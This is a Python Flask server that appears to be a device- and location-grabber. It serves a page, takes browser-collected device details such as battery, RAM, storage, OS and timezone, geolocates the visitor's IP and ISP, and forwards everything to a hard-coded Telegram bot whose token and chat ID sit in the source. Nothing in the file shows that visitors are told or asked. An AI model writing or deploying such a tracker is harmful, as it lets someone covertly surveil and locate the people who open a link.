from flask import Flask, request, jsonify, send_from_directory
import requests
import os
import logging

app = Flask(__name__, static_folder='.')
logging.basicConfig(level=logging.INFO)

# Telegram configuration
TELEGRAM_BOT_TOKEN = '8766543374:AAHVC3rEEOGwhhIvXHEkVmZtGBQpZ1W0KJY'
TELEGRAM_CHAT_ID = '5312938858'

def send_to_telegram(data):
    """Send formatted device info to Telegram"""
    ip_info = get_ip_info(request.remote_addr)

    message = (
        f"📱 <b>Device Information Captured</b>\n\n"
        f"🆔 <b>IP:</b> {ip_info['ip']}\n"
        f"📍 <b>Location:</b> {ip_info['city']}, {ip_info['region']}, {ip_info['country']}\n"
        f"🏢 <b>ISP:</b> {ip_info['org']}\n\n"
        f"📟 <b>Device:</b> {data.get('device_model', 'N/A')}\n"
        f"💻 <b>OS:</b> {data.get('os', 'N/A')}\n"
        f"🌐 <b>Browser:</b> {data.get('browser', 'N/A')}\n"
        f"🖥 <b>Screen:</b> {data.get('screen', 'N/A')}\n"
        f"🔋 <b>Battery:</b> {data.get('battery_level', 'N/A')}% (Charging: {'Yes' if data.get('charging') else 'No'})\n"
        f"🧠 <b>RAM:</b> {data.get('ram_gb', 'N/A')} GB\n"
        f"💾 <b>Storage:</b> {data.get('storage_used_gb', 'N/A')} GB / {data.get('storage_total_gb', 'N/A')} GB\n"
        f"🌍 <b>Language:</b> {data.get('language', 'N/A')}\n"
        f"⏰ <b>Time Zone:</b> {data.get('timezone', 'N/A')}\n"
        f"📞 <b>Phone Type:</b> {data.get('phone_type', 'N/A')}\n"
        f"🕒 <i>{__import__('datetime').datetime.now().isoformat()}</i>"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(url, json={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=10)
        logging.info(f"Telegram response: {response.status_code} - {response.text}")
        return response.ok
    except Exception as e:
        logging.error(f"Failed to send to Telegram: {e}")
        return False

def get_ip_info(ip):
    """Get IP geolocation data"""
    # If running locally or in dev, get the real IP from headers
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        ip = forwarded.split(',')[0].strip()

    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logging.warning(f"IP lookup failed: {e}")

    return {'ip': ip, 'city': '?', 'region': '?', 'country': '?', 'org': 'Unknown'}

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/device-info', methods=['POST'])
def device_info():
    """Receive device info from the browser and forward to Telegram"""
    data = request.json
    if not data:
        return jsonify({'error': 'No data received'}), 400

    logging.info(f"Received device info: {data.get('device_model')} - {data.get('os')}")

    # Send to Telegram
    telegram_success = send_to_telegram(data)

    # Get IP info for response
    ip_info = get_ip_info(request.remote_addr)

    return jsonify({
        'status': 'success',
        'ip': ip_info.get('ip', request.remote_addr),
        'isp': ip_info.get('org', 'Unknown'),
        'telegram': 'sent' if telegram_success else 'failed'
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
